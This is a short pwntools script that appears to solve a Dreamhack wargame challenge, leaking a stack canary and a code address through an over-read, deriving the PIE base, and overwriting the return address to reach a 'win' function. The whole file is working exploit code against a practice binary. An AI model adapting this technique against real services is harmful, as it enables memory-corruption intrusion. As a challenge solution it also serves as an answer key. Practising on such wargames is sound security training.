from pwn import *

r = remote("host3.dreamhack.games", 21348)
e = ELF("./main")

# get canary
r.sendafter(b"Pattern: ", b"A"*7)
r.sendlineafter(b"length: ", b"1000")
r.recvuntil(b"A"*1001)
canary = u64(b"\x00"+r.recvn(7))

# get main (canary : 1000, canary -> SFP -> ret -> dummy -> main 1000 + 8 + 8 + 8 + 8 = 1032)
# an = 1000-a+32

r.sendafter(b"Pattern: ", b"A"*43)
r.sendlineafter(b"length: ", b"1000")
r.recvuntil(b"A"*1032)
main = u64(r.recvn(6)+b"\x00\x00")
pie_base = main - e.symbols["main"]
win = pie_base + e.symbols["win"]
ret = pie_base + 0x101a

# overwrite ret (1024)
# an = 1000-a+24

payload = b"B"*40 + p64(canary) + b"C"*8 + p64(win+5)
r.sendafter(b"Pattern: ", payload)
r.sendlineafter(b"length: ", b"1000")

r.sendafter(b"Pattern: ", b"A")
r.sendlineafter(b"length: ", b"1001")
r.interactive()